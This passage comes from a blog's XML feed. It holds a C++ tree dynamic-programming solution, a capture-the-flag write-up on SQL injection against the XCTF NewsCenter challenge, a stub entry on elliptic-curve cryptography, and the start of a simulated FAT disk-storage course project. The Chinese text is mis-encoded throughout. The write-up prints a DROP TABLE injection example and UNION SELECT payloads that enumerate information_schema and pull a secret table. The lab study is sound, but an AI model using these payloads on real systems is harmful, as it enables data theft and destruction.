<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * @Author      : YaleXin</span></span><br><span class="line"><span class="comment"> * @Email       : me@yalexin.top</span></span><br><span class="line"><span class="comment"> * @LastEditors : YaleXin</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> MAX_N = <span class="number">101</span>;</span><br><span class="line"><span class="keyword">int</span> treeTable[MAX_N][<span class="number">2</span>], nums[MAX_N], treeSize[MAX_N], f[MAX_N];</span><br><span class="line"><span class="comment">// deepth æ˜¯è¯¥èŠ‚ç‚¹è·ç¦» 1 å·èŠ‚ç‚¹çš„è·ç¦»</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dfs</span><span class="params">(<span class="keyword">int</span> nodeId, <span class="keyword">int</span> parent, <span class="keyword">int</span> deepth)</span></span>&#123;</span><br><span class="line">    treeSize[nodeId] = nums[nodeId];</span><br><span class="line">    <span class="keyword">int</span> lChild = treeTable[nodeId][<span class="number">0</span>], rChild = treeTable[nodeId][<span class="number">1</span>];</span><br><span class="line">    <span class="comment">// å¦‚æœå­˜åœ¨å·¦å­©å­</span></span><br><span class="line">    <span class="keyword">if</span> (lChild)&#123;</span><br><span class="line">        dfs(lChild, nodeId, deepth + <span class="number">1</span>);</span><br><span class="line">        treeSize[nodeId] += treeSize[lChild];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// å¦‚æœå­˜åœ¨å³å­©å­</span></span><br><span class="line">    <span class="keyword">if</span> (rChild)&#123;</span><br><span class="line">        dfs(rChild, nodeId, deepth + <span class="number">1</span>);</span><br><span class="line">        treeSize[nodeId] += treeSize[rChild];</span><br><span class="line">    &#125;</span><br><span class="line">    f[<span class="number">1</span>] += nums[nodeId] * deepth;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">int</span> minAns = <span class="number">0x7fffffff</span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dp</span><span class="params">(<span class="keyword">int</span> nodeId, <span class="keyword">int</span> parent)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> lChild = treeTable[nodeId][<span class="number">0</span>], rChild = treeTable[nodeId][<span class="number">1</span>];</span><br><span class="line">    <span class="keyword">if</span>(lChild)&#123;</span><br><span class="line">        f[lChild] = f[nodeId] + treeSize[<span class="number">1</span>] - (treeSize[lChild] &lt;&lt; <span class="number">1</span>);</span><br><span class="line">        dp(lChild, nodeId);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(rChild)&#123;</span><br><span class="line">        f[rChild] = f[nodeId] + treeSize[<span class="number">1</span>] - (treeSize[rChild] &lt;&lt; <span class="number">1</span>);</span><br><span class="line">        dp(rChild, nodeId);</span><br><span class="line">    &#125;</span><br><span class="line">    minAns = <span class="built_in">min</span>(minAns, f[nodeId]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    ios::sync_with_stdio(<span class="literal">false</span>);</span><br><span class="line">    <span class="keyword">int</span> n, w, u, v;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;n);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++)&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%d%d%d"</span>, &amp;nums[i], &amp;treeTable[i][<span class="number">0</span>], &amp;treeTable[i][<span class="number">1</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    dfs(<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    dp(<span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; minAns &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>ç®—æ³•</category>
      </categories>
      <tags>
        <tag>è´ªå¿ƒç®—æ³•</tag>
        <tag>åŠ¨æ€è§„åˆ’</tag>
        <tag>é€’å½’</tag>
        <tag>C++</tag>
        <tag>æ·±åº¦ä¼˜å…ˆ</tag>
      </tags>
  </entry>
  <entry>
    <title>æ¨¡ç³ŠæŸ¥è¯¢ä¹‹SQLæ³¨å…¥ï¼ˆæ”»é˜²ä¸–ç•ŒNewsCenteré¢˜è§£ï¼‰</title>
    <url>/2022/05/22/%E6%A8%A1%E7%B3%8A%E6%9F%A5%E8%AF%A2%E4%B9%8BSQL%E6%B3%A8%E5%85%A5%EF%BC%88%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CNewsCenter%E9%A2%98%E8%A7%A3%EF%BC%89/</url>
    <content><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p><code>SQL</code>æ³¨å…¥æ˜¯ç”±äºå¼€å‘äººå‘˜ç¼–å†™ç¨‹åºä¸å½“ï¼Œæ”»å‡»è€…å¯ä»¥åœ¨å¼€å‘äººå‘˜ç¼–å†™å¥½çš„<code>SQL</code>è¯­å¥çš„åŸºç¡€ä¸Šï¼Œæ„é€ é¢å¤–çš„<code>SQL</code>è¯­å¥ï¼Œä»è€Œå‘ç”Ÿæ„å¤–çš„é”™è¯¯ã€‚</p>
<a id="more"></a>

<p>ä¾‹å¦‚ï¼Œå¦‚æœæˆ‘ä»¬æœ‰ä¸€ä¸ªæ ¹æ®<code>id</code>æŸ¥è¯¢çš„è¯­å¥ï¼š</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> test_table <span class="keyword">where</span> <span class="keyword">id</span> = test_id</span><br></pre></td></tr></table></figure>

<p>ä½¿ç”¨é«˜çº§è¯­è¨€ç¼–å†™è¯­å¥ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">String sql = <span class="string">"select * from test_table where id = "</span> + test_id;</span><br></pre></td></tr></table></figure>

<p>å¦‚æœæ”»å‡»è€…å°è¯•å°†<code>test_id</code>æ„é€ æˆ</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">2;<span class="keyword">DROP</span> <span class="keyword">TABLE</span> test_table;</span><br></pre></td></tr></table></figure>

<p>é‚£ä¹ˆæœ€ç»ˆæ‰§è¡Œçš„<code>SQL</code>è¯­å¥ä¸ºï¼š</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> test_table <span class="keyword">where</span> <span class="keyword">id</span> = <span class="number">2</span>;</span><br><span class="line"><span class="keyword">DROP</span> <span class="keyword">TABLE</span> test_table;</span><br></pre></td></tr></table></figure>

<p>å½“ç„¶ä½ å¯èƒ½ä¼šè¯´æ”»å‡»è€…ä¸çŸ¥é“è¡¨åï¼Œå› æ­¤ä¸Šé¢çš„å¾ˆéš¾æ„é€ å‡ºæ¥ã€‚ä½†æ˜¯æˆ‘æƒ³è¯´çš„æ˜¯å¦‚æœå­˜åœ¨<code>SQL</code>æ³¨å…¥é£é™©çš„æ—¶å€™ï¼Œ<strong>æ”»å‡»è€…è·å–è¡¨åçš„æ–¹å¼ä½ éš¾ä»¥æƒ³è±¡å¾—åˆ°</strong>ã€‚</p>
<h2 id="é¢˜ç›®èƒŒæ™¯"><a href="#é¢˜ç›®èƒŒæ™¯" class="headerlink" title="é¢˜ç›®èƒŒæ™¯"></a>é¢˜ç›®èƒŒæ™¯</h2><p>æ”»é˜²ä¸–ç•Œ<a href="https://adworld.xctf.org.cn/task/answer?type=web&number=3&grade=1&id=4686&page=1" target="_blank" rel="noopener"><code>NewsCenter</code></a></p>
<h2 id="è§£é¢˜è¿‡ç¨‹"><a href="#è§£é¢˜è¿‡ç¨‹" class="headerlink" title="è§£é¢˜è¿‡ç¨‹"></a>è§£é¢˜è¿‡ç¨‹</h2><p>æ‰“å¼€åœºæ™¯åï¼Œå‘ç°æ˜¯ä¸€ä¸ªæ–°é—»é¡µé¢ï¼Œè¾“å…¥æ¡†ä¸­è¾“å…¥å†…å®¹ï¼Œç„¶åè¿›è¡Œæ¨¡ç³ŠæŸ¥è¯¢ã€‚</p>
<p>è€Œæ¨¡ç³ŠæŸ¥è¯¢çš„ä¸€èˆ¬è¯­å¥ä¸ºï¼š</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">from</span> <span class="keyword">table</span> <span class="keyword">where</span> username <span class="keyword">like</span> <span class="string">'%str%'</span></span><br></pre></td></tr></table></figure>

<p>å°è¯•è¾“å…¥<code>%&#39;</code>ï¼Œå‘ç°åå°æŠ¥é”™ï¼Œå› æ­¤åˆ¤å®šåå°å¯ä»¥è¿›è¡Œ<code>SQL</code>æ³¨å…¥ã€‚</p>
<p>ç„¶åç•¥åŠ æ€è€ƒï¼Œ<code>flag</code>åº”è¯¥å°±è—åœ¨å½“å‰çš„æ•°æ®åº“ä¸­ï¼Ÿå› æ­¤å…ˆæ•°æ®åº“åï¼›å…ˆè¾“å…¥<code>%&#39;;SELECT DATABASE(); --</code>ï¼ˆä¸­åˆ’çº¿æ˜¯å°†åé¢çš„<code>SQL</code>è¯­å¥å¤„ç†æˆæ³¨é‡Šå½¢å¼ï¼‰ï¼Œå‘ç°å¹¶æ²¡æœ‰è¿”å›é¢„æœŸçš„ç»“æœï¼Œç„¶åæƒ³äº†æƒ³ï¼ŒæŸ¥è¯¢åˆ°çš„æ•°æ®åº”è¯¥æ˜¯æœ‰å¥½å‡ åˆ—ï¼Œç„¶åä¸€è¡Œæ˜¯ä¸€ä¸ªæ–°é—»ï¼Œå°†å…¶æ¸²æŸ“ï¼Œå†è¿”å›åˆ°æµè§ˆå™¨ï¼Œæ¥ç€åˆ†æäº†ä¸€ä¸‹ï¼Œæ¯ä¸ªæ–°é—»éƒ½æœ‰æ ‡é¢˜å’Œå†…å®¹ï¼ŒæŸ¥è¯¢åº”è¯¥è‡³å°‘æœ‰ä¸¤åˆ—ï¼Œå†æ¬¡å°è¯•æ„é€ <code>SQL</code>è¯­å¥</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">%' UNION  <span class="keyword">SELECT</span> <span class="keyword">DATABASE</span>(),<span class="keyword">DATABASE</span>(); <span class="comment">--</span></span><br></pre></td></tr></table></figure>

<p><code>UNION</code>çš„æ„æ€æ˜¯è¯´å°†ä¸¤ä¸ªæŸ¥è¯¢ç»“æœåˆå¹¶ï¼Œå¯ä»¥æ‰§è¡Œçš„å‰ææ˜¯ä¸¤ä¸ªæŸ¥è¯¢æœ‰ç›¸åŒçš„åˆ—æ•°ï¼Œå…·ä½“ç”¨æ³•å¯ä»¥å»ç½‘ä¸ŠæŸ¥æŸ¥ã€‚</p>
<p>å‘ç°è¿˜æ˜¯æŠ¥é”™ï¼Œå†æ¬¡å¢åŠ ä¸€åˆ—è¿›è¡Œå°è¯•ï¼š</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">%' UNION  <span class="keyword">SELECT</span> <span class="keyword">DATABASE</span>(),<span class="keyword">DATABASE</span>(), <span class="keyword">DATABASE</span>(); <span class="comment">--</span></span><br></pre></td></tr></table></figure>

<p>æœç„¶åœ¨æœ€åçš„æ–°é—»åˆ—è¡¨ä¸­å‡ºç°äº†æ•°æ®åº“å<code>news</code>ã€‚</p>
<p>ç„¶åçœ‹çœ‹è¯¥æ•°æ®åº“ä¸­éƒ½æœ‰å“ªäº›è¡¨ï¼š</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">aaaaaaaa%' UNION <span class="keyword">SELECT</span> table_name,table_name,table_name <span class="keyword">FROM</span> information_schema.TABLES <span class="keyword">WHERE</span> TABLE_SCHEMA=<span class="string">'news'</span>; <span class="comment">--</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p><code>aaaaaaaa</code>å¯ä»¥éšä¾¿è®¾ç½®ï¼Œæœ€å¥½æ˜¯æ–°é—»ä¸­æ²¡æœ‰å‡ºç°è¿‡çš„å­—ç¬¦ï¼Œè¿™æ ·å­å°±æ–¹ä¾¿è·å–æˆ‘ä»¬æƒ³è¦çš„å†…å®¹äº†ã€‚</p>
</blockquote>
<p>ç„¶åå‘ç°æœ‰ä¸¤å¼ è¡¨ï¼Œä¸€ä¸ªæ˜¯<code>news</code>ï¼Œå¦ä¸€ä¸ªæ˜¯<code>secret_table</code>ï¼</p>
<p>ç„¶åçœ‹çœ‹ç¬¬äºŒå¼ è¡¨çš„å­—æ®µåï¼š</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">aaaaa%' UNION  <span class="keyword">SELECT</span> COLUMN_NAME,COLUMN_NAME,COLUMN_NAME <span class="keyword">FROM</span> information_schema.COLUMNS <span class="keyword">WHERE</span> table_name = <span class="string">'secret_table'</span>; <span class="comment">--</span></span><br></pre></td></tr></table></figure>

<p>å‡ºç°äº†ä¸€ä¸ª<code>fl4g</code>å­—æ®µåï¼Œå†ç»§ç»­æŸ¥è¯¢</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">aaaaa%' UNION  <span class="keyword">SELECT</span> fl4g, fl4g, fl4g <span class="keyword">FROM</span> secret_table; <span class="comment">--</span></span><br></pre></td></tr></table></figure>

<p>è¿”å›äº†<code>QCTF{sq1_inJec7ion_ezzz}</code>ã€‚è‡³æ­¤ï¼Œæœ¬é¢˜ç­”æ¡ˆ<strong>æ°´è½çŸ³å‡º</strong></p>
<hr>
<p>==é»‘å¸½ç™½å¸½ï¼Œå°±åœ¨ä¸€å¿µä¹‹é—´ï¼==</p>
]]></content>
      <categories>
        <category>æ”»é˜²ä¸–ç•Œ</category>
      </categories>
      <tags>
        <tag>MySql</tag>
      </tags>
  </entry>
  <entry>
    <title>æ¤­åœ†æ›²çº¿åŠ å¯†ECC</title>
    <url>/2022/10/26/%E6%A4%AD%E5%9C%86%E6%9B%B2%E7%BA%BF%E5%8A%A0%E5%AF%86ECC/</url>
    <content><![CDATA[<p>æˆ‘ä»¬ä¹‹å‰ä»‹ç»è¿‡äº†RSAåŠ å¯†ç®—æ³•ï¼Œå®ƒæ˜¯ä¸€ç§å…¬é’¥å¯†ç ï¼Œä»Šå¤©ä»‹ç»çš„æ¤­åœ†æ›²çº¿åŠ å¯†ç®—æ³•ä¹Ÿå±äºå…¬é’¥åŠ å¯†ç®—æ³•ã€‚</p>
]]></content>
  </entry>
  <entry>
    <title>æ¨¡æ‹Ÿè®¾è®¡ç£ç›˜æ–‡ä»¶çš„é“¾æ¥å­˜å‚¨ç»“æ„</title>
    <url>/2020/07/02/%E6%A8%A1%E6%8B%9F%E8%AE%BE%E8%AE%A1%E7%A3%81%E7%9B%98%E6%96%87%E4%BB%B6%E7%9A%84%E9%93%BE%E6%8E%A5%E5%AD%98%E5%82%A8%E7%BB%93%E6%9E%84/</url>
    <content><![CDATA[<h2 id="è¯¾é¢˜è¦æ±‚"><a href="#è¯¾é¢˜è¦æ±‚" class="headerlink" title="è¯¾é¢˜è¦æ±‚"></a>è¯¾é¢˜è¦æ±‚</h2><ol>
<li><p>ç£ç›˜æ–‡ä»¶çš„ç®¡ç†é‡‡ç”¨æ˜¾å¼é“¾æ¥ç»“æ„ï¼Œå°†æ–‡ä»¶å ç”¨çš„ç‰©ç†å—å·å’Œé“¾æ¥æŒ‡é’ˆè®°å½• åœ¨ä¸€å¼ æ–‡ä»¶åˆ†é…è¡¨ï¼ˆ<code>FAT</code>ï¼‰ä¸­ã€‚æ–‡ä»¶ç¬¬ä¸€å—çš„å—å·è®°å½•åœ¨ç´¢å¼•ç»“ç‚¹ä¸­ã€‚<a id="more"></a>æ–‡ä»¶ç›®å½• åªè®°å½•æ–‡ä»¶åå’Œç´¢å¼•ç»“ç‚¹çš„ç¼–å·ã€‚ç´¢å¼•ç»“ç‚¹çš„ç»“æ„å¦‚ä¸‹ï¼š </p>
<table>
<thead>
<tr>
<th>ç´¢å¼•ç»“ç‚¹ç¼–å·</th>
<th>æ–‡ä»¶å±æ€§</th>
<th>åˆ›å»ºæ—¶é—´</th>
<th>æ–‡ä»¶ç¬¬ä¸€å—å—å·</th>
<th>æ–‡ä»¶å ç”¨ç›˜å—æ•°</th>
<th>å¤‡ç”¨</th>
</tr>
</thead>
<tbody><tr>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody></table>
</li>
<li><p>å‡å®šç£ç›˜å­˜å‚¨ç©ºé—´å…±æœ‰ 100 ä¸ªç‰©ç†å—ç”¨äºå­˜æ”¾æ•°æ®ï¼Œ ç›®å½•æ–‡ä»¶å’Œç´¢å¼•ç»“ç‚¹å¯ ç›´æ¥è®¿é—®ï¼Œä¸å­˜æ”¾åœ¨è¿™ 100 ä¸ªå—ä¸­ã€‚</p>
</li>
<li><p>ä¸€ä¸ªç‰©ç†å—å¯å­˜æ”¾ 3 ä¸ªæ–‡ä»¶é€»è¾‘è®°å½•ï¼Œå¹¶ä¸”å‡è®¾æ–‡ä»¶é€»è¾‘è®°å½•å®šé•¿ã€‚</p>
</li>
<li><p>è¦æ±‚ç”¨é”®ç›˜è¾“å…¥çš„æ–¹å¼æ¨¡æ‹Ÿç”¨æˆ·è¯»å†™è¯·æ±‚ï¼Œèœå•æ ¼å¼å»ºè®®å¦‚ä¸‹ï¼š </p>
<ul>
<li><code>Createï¼ˆfilenameï¼‰</code> </li>
<li><code>Writeï¼ˆfilenameï¼Œ textï¼Œ logical_record_noï¼‰</code> </li>
<li><code>Read (filename, logical_record_no)</code> </li>
<li><code>Deleteï¼ˆfilenameï¼‰</code> å…¶ä¸­<code>filename</code>æ˜¯è¦è¯»å†™çš„æ–‡ä»¶åï¼Œ<code>text</code> æ˜¯å†™å…¥çš„å†…å®¹ï¼Œ<code>logical_record_no</code>æ˜¯é€»è¾‘ è®°å½•å·ã€‚<code>Create</code>ã€<code>Write</code>ã€<code>Read</code>ã€<code>Delete</code>åˆ†åˆ«è¡¨ç¤ºåˆ›å»ºä¸€ä¸ªæ–‡ä»¶ï¼Œå‘æ–‡ä»¶çš„æŸä¸ªé€» è¾‘è®°å½•å†™ï¼Œä»æ–‡ä»¶çš„æŸä¸ªé€»è¾‘è®°å½•è¯»ï¼Œåˆ é™¤ä¸€ä¸ªæ–‡ä»¶ã€‚ </li>
</ul>
</li>
<li><p>æ–‡ä»¶å­˜å‚¨ç©ºé—´ç®¡ç†é‡‡ç”¨ä½ç¤ºå›¾ï¼ˆä½ç¤ºå›¾ä¸º 7 è¡Œï¼Œ16 åˆ—ï¼‰çš„æ–¹å¼ã€‚ </p>
</li>
<li><p>è¦æ±‚ç¨‹åºå¯ä»¥æ‰“å°<code>FAT</code>ä»¥åŠä½ç¤ºå›¾çš„æƒ…å†µã€‚ </p>
</li>
</ol>
<h2 id="ç»“æ„è®¾è®¡"><a href="#ç»“æ„è®¾è®¡" class="headerlink" title="ç»“æ„è®¾è®¡"></a>ç»“æ„è®¾è®¡</h2><h3 id="æ•°æ®ç»“æ„"><a href="#æ•°æ®ç»“æ„" class="headerlink" title="æ•°æ®ç»“æ„"></a>æ•°æ®ç»“æ„</h3><ul>
<li><p>ç»“ç‚¹é¡¹</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">Inode</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> firstBlockId;     <span class="comment">// æ–‡ä»¶ç¬¬ä¸€å—å—å·</span></span><br><span class="line">    <span class="keyword">int</span> lastBlockId;      <span class="comment">// æ–‡ä»¶æœ€åä¸€å—å—å·</span></span><br><span class="line">    <span class="keyword">int</span> usedBlocksNum;    <span class="comment">// æ–‡ä»¶å ç”¨çš„ç›˜å—æ•°</span></span><br><span class="line">    <span class="keyword">time_t</span> createTime;    <span class="comment">// æ–‡ä»¶åˆ›å»ºæ—¶é—´</span></span><br><span class="line">    <span class="keyword">time_t</span> LastEditTime;  <span class="comment">// æ–‡ä»¶ä¸Šæ¬¡ä¿®æ”¹æ—¶é—´</span></span><br><span class="line">    <span class="keyword">int</span> permission;       <span class="comment">// æ–‡ä»¶æƒé™</span></span><br><span class="line">    <span class="keyword">int</span> isDelete;         <span class="comment">// è¯¥èŠ‚ç‚¹æ˜¯å¦è¢«æ ‡è®°â€œå·²åˆ é™¤â€</span></span><br><span class="line">    <span class="keyword">char</span> standby[<span class="number">20</span>];     <span class="comment">// å¤‡ç”¨</span></span><br><span class="line">&#125; Inode;</span><br></pre></td></tr></table></figure>
</li>
<li><p>ç›®å½•é¡¹</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">listItem</span> &#123;</span></span><br><span class="line">    <span class="keyword">char</span> fileName[<span class="number">256</span>];  <span class="comment">// æ–‡ä»¶åå­—</span></span><br><span class="line">    <span class="keyword">int</span> nodeId;          <span class="comment">// æ–‡ä»¶å¯¹åº”çš„ç»“ç‚¹ç¼–å·</span></span><br><span class="line">&#125; listItem;</span><br></pre></td></tr></table></figure>
</li>
<li><p>ç‰©ç†ç›˜å—å·</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">Block</span> &#123;</span></span><br><span class="line">    <span class="comment">// æ¯ä¸€ä¸ªç‰©ç†å—æœ‰ä¸‰å—é€»è¾‘è®°å½•å·</span></span><br><span class="line">    <span class="keyword">char</span> firstLogical[LOGICALSIZE];</span><br><span class="line">    <span class="keyword">char</span> secondLogical[LOGICALSIZE];</span><br><span class="line">    <span class="keyword">char</span> thirdogical[LOGICALSIZE];</span><br><span class="line">&#125; Block;</span><br></pre></td></tr></table></figure>
</li>
<li><p>æŠ½è±¡ç£ç›˜</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">Disk</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> FAT[BLOCKNUM];             <span class="comment">// æœ€å¤šæœ‰BLOCKNUMä¸ªè¡¨é¡¹</span></span><br><span class="line">    <span class="keyword">int</span> bitmap[ROW][COL];          <span class="comment">// ç¤ºä½å›¾</span></span><br><span class="line">    listItem directory[BLOCKNUM];  <span class="comment">// ç›®å½• æœ€å¤šæœ‰BLOCKNUMä¸ªç›®å½•é¡¹</span></span><br><span class="line">    Inode FDI[BLOCKNUM];  <span class="comment">// ç´¢å¼•ç»“ç‚¹é›†åˆ æœ€å¤šæœ‰BLOCKNUMä¸ªèŠ‚ç‚¹</span></span><br><span class="line">    <span class="keyword">int</span> fileNum;</span><br><span class="line">    Block blocks[BLOCKNUM];  <span class="comment">// æ€»çš„ç‰©ç†ç›˜å—æ•°</span></span><br><span class="line">    <span class="keyword">int</span> freeBlock;           <span class="comment">// ç©ºé—²ç›˜å—æ•°é‡</span></span><br><span class="line">&#125; Disk;</span><br></pre></td></tr></table></figure>

</li>
</ul>
<h3 id="è®¾è®¡æ€è·¯"><a href="#è®¾è®¡æ€è·¯" class="headerlink" title="è®¾è®¡æ€è·¯"></a>è®¾è®¡æ€è·¯</h3><p>ç¨‹åºä¸€å¼€å§‹å°†ç£ç›˜æ ¼å¼åŒ–ï¼Œç„¶åæ ¹æ®ç”¨æˆ·é€‰æ‹©è¿›è¡Œç›¸å…³æ“ä½œã€‚</p>
<ul>
<li><p>åˆ›å»ºæ–‡ä»¶ï¼š</p>
<p>é¦–å…ˆç”³è¯·ä¸€å—ç©ºé—²ç›˜å—ï¼ˆå³é»˜è®¤ä¸€ä¸ªæ–‡ä»¶åˆå§‹å ç”¨ä¸€å—ç›˜å—ï¼‰ï¼ŒåŒæ—¶å°†ç”³è¯·åˆ°çš„ç›˜å—è®°ä¸ºâ€œå·²ä½¿ç”¨â€çŠ¶æ€ã€‚</p>
<p>ç”³è¯·æ–¹å¼æ˜¯ï¼šé€‰å®šä¸€ä¸ªéšæœºæ•°ä½œä¸ºâ€œåŸºå€â€ï¼Œå‡å¦‚è¯¥ç›˜å—å·²è¢«å ç”¨ï¼Œå°è¯•ç”³è¯·è¯¥â€œåŸºå€â€çš„ä¸‹ä¸€å—ï¼Œå‡è‹¥ä»ç„¶è¢«å ç”¨ï¼Œåˆ™ç»§ç»­å¾€åå°è¯•â€¦â€¦â€¦</p>
</li>
<li><p>è¯»å–æ–‡ä»¶ï¼š</p>
<p>æ ¹æ®æ–‡ä»¶åï¼Œåœ¨ç›®å½•ä¸­æ£€ç´¢ï¼Œå°†è¯¥æ–‡ä»¶å¯¹åº”çš„ç´¢å¼•ç»“ç‚¹æ‰¾åˆ°ã€‚ç„¶åæ ¹æ®æ¬²è¯»å–çš„é€»è¾‘è®°å½•å·è¿›è¡Œå°è¯•è¯»å–ï¼ˆä¸€ä¸ªæ–‡ä»¶æœ€å¤šæ‹¥æœ‰çš„é€»è¾‘è®°å½•å·ä¸ºï¼š<code>max = 3 * n - 1</code>ï¼Œ<code>n</code>æ˜¯æ–‡ä»¶å ç”¨ç›˜å—æ•°ï¼Œå³ç¼–å·ä»é›¶å¼€å§‹ï¼‰ã€‚</p>
<p>æ–¹æ³•æ˜¯ï¼šæ ¹æ®åœ¨æ£€ç´¢ç›®å½•å¾—åˆ°çš„ç´¢å¼•ç»“ç‚¹è·å¾—è¯¥æ–‡ä»¶å ç”¨çš„ç¬¬ä¸€å—ç›˜å—å·ï¼Œå‡å¦‚è¯¥ç›˜å—ä¸æ˜¯ç”¨æˆ·æ‰€è¦è¯»å–çš„ç›˜å—ï¼Œåˆ™æ ¹æ®æ–‡ä»¶åˆ†é…è¡¨è·å–ä¸‹ä¸€å—ç›˜å—å·ï¼Œä¸æ–­é‡å¤ä¸Šé¢è¿‡ç¨‹ï¼Œç›´åˆ°æ‰¾åˆ°ç›®çš„ç›˜å—å·ã€‚</p>
</li>
<li><p>å†™å…¥æ–‡ä»¶</p>
<ul>
<li><p>å†™å…¥æ•°æ®ï¼š</p>
<p>å‘æŸä¸ªæ–‡ä»¶çš„æŸä¸ªé€»è¾‘è®°å½•å·ä¸­å†™å…¥æ•°æ®ï¼Œå†™å…¥ä¹‹å‰æ£€æŸ¥é€»è¾‘è®°å½•å·çš„åˆæ³•æ€§</p>
</li>
<li><p>ä¿®æ”¹æ–‡ä»¶å¤§å°ï¼šå‡è‹¥æ–°æ–‡ä»¶å¤§å°å°äºæ—§æ–‡ä»¶å¤§å°ï¼Œåˆ™åªä¿ç•™æ–°æ–‡ä»¶å¤§å°çš„æ•°æ®</p>
</li>
</ul>
</li>
<li><p>åˆ é™¤æ–‡ä»¶ï¼š</p>
<p>å…ˆæ ¹æ®æ–‡ä»¶åï¼Œåœ¨ç›®å½•ä¸­æ£€ç´¢å‡ºç›¸åº”çš„ç´¢å¼•ç»“ç‚¹ï¼Œæ ¹æ®ç´¢å¼•ç»“ç‚¹è·å¾—ç¬¬ä¸€å—ç›˜å—å·ï¼Œå°†è¯¥ç›˜å—ç½®ä¸ºâ€œæœªä½¿ç”¨çŠ¶æ€â€ï¼Œå¹¶å°†è¿™ä¸€ç›˜å—æŒ‡å‘çš„ä¸‹ä¸€å—ç›˜å—ï¼ˆå‡å¦‚å­˜åœ¨ï¼‰ä¹Ÿç½®ä¸ºâ€œæœªä½¿ç”¨â€ï¼Œä¾æ­¤é‡å¤ï¼Œç›´è‡³è¯¥æ–‡ä»¶å ç”¨ç›˜å—å…¨éƒ½å½’è¿˜ã€‚åŒæ—¶ç›˜å—å¯¹åº”çš„ç¤ºä½å›¾ä¹Ÿè¦æ›´æ–°çŠ¶æ€ã€‚</p>
</li>
</ul>
<h2 id="æºç¨‹åº"><a href="#æºç¨‹åº" class="headerlink" title="æºç¨‹åº"></a>æºç¨‹åº</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * @Author: YaleXin</span></span><br><span class="line"><span class="comment"> * @Date: 2020-06-07 15:53:40</span></span><br><span class="line"><span class="comment"> * @LastEditTime: 2020-07-01 21:08:41</span></span><br><span class="line"><span class="comment"> * @LastEditors: YaleXin</span></span><br><span class="line"><span class="comment"> * @Description: æ“ä½œç³»ç»Ÿè¯¾ç¨‹è®¾è®¡</span></span><br><span class="line"><span class="comment"> * @FilePath: \my_c_workspace\OS\design\main.c</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LOGICALSIZE 1024  <span 